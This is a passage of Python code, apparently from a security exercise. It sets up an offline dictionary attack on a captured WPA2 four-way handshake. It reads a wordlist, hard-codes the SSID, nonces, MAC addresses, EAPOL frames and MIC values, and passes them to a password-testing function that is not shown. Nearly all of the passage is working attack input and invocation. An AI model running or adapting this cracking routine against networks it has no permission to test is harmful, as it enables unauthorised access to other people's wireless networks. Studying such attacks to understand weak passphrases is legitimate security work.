if __name__ == "__main__":

    # Read a file of passwords containing
    # passwords separated by a newline
    with open("rockyou_mod2.dic", "r", encoding="latin-1") as f:
        S = []
        for l in f:
            S.append(l.strip())
    # ssid name
    ssid = "VTR-1645213"
    # ANonce
    aNonce = a2b_hex("4c2fb7eca28fba45accefde3ac5e433314270e04355b6d95086031b004a31935")
    # SNonce
    sNonce = a2b_hex("30bde6b043c2aff8ea482dee7d788e95b634e3f8e3d73c038f5869b96bbe9cdc")
    # Authenticator MAC (AP)
    apMac = a2b_hex("b0487ad2dc18")
    # Station address: MAC of client
    cliMac = a2b_hex("eede678cdf8b")
    # The first MIC
    mic1 = "1813acb976741b446d43369fb96dbf90"
    # The entire 802.1x frame of the second handshake message with the MIC field set to all zeros
    data1 = a2b_hex(
        "0103007502010a0000000000000000000130bde6b043c2aff8ea482dee7d788e95b634e3f8e3d73c038f5869b96bbe9cdc000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020000")
    # The second MIC
    mic2 = "a349d01089960aa9f94b5857b0ea10c6"
    # The entire 802.1x frame of the third handshake message with the MIC field set to all zeros
    data2 = a2b_hex(
        "020300970213ca001000000000000000024c2fb7eca28fba45accefde3ac5e433314270e04355b6d95086031b004a3193500000000000000000000000000000000cd000000000000000000000000000000000000000000000000000000000000000038db0eb43c3faf2c0e8b7e8a471f962c307e707e4718be724459167a88fa281f4d7ce38f012943da788d0a7159c9fac6ad71483d788cecf18b")
    # The third MIC
    mic3 = "5cf0d63af458f13a83daa686df1f4067"
    # The entire 802.1x frame of the forth handshake message with the MIC field set to all zeros
    data3 = a2b_hex(
        "0103005f02030a0000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
    # Run an offline dictionary attack against the access point
    TestPwds(S, ssid, aNonce, sNonce, apMac, cliMac, data1, data2, data3, mic1, mic2, mic3)

